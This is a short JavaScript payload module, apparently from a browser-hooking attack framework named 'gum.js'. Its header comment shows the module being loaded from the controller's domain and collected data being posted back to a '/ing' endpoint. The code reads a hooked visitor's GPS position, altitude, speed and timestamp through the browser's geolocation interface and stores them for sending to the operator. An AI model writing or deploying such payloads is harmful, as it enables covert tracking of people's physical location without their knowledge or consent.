/*
    quininer - 140524
        get_gps - gum.js
                - GPS info
            gum.script('http://' + gum.domain + '/static/brows/get_gps');
            //setTimeout(function(){
            //    gum.post('http://' + gum.domain + '/ing', gum.backinfo);
            //    gum.backinfo = {};
            //}, 10*1000);
                and
            null

*/
(function(gps){
    if(!gps){
        gum.backinfo['gps'] = 'Not supported navigator.geolocation!'
    };
    gps.getCurrentPosition(function(e){
        var coord = e.coords;
        gum.backinfo['gps'] = 'latitude:' + coord.latitude
            + '; longitude:' + coord.longitude + '; altitude:'
            + coord.altitude + '; heading:' + coord.heading
            + '; accuracy:' + coord.accuracy + '; speed:'
            + coord.speed + '; time:' + e.timestamp;
    }, function(e){
        gum.backinfo['gps'] = 'code:' + e.code + '; message:' + e.message;
    })
})(navigator.geolocation)
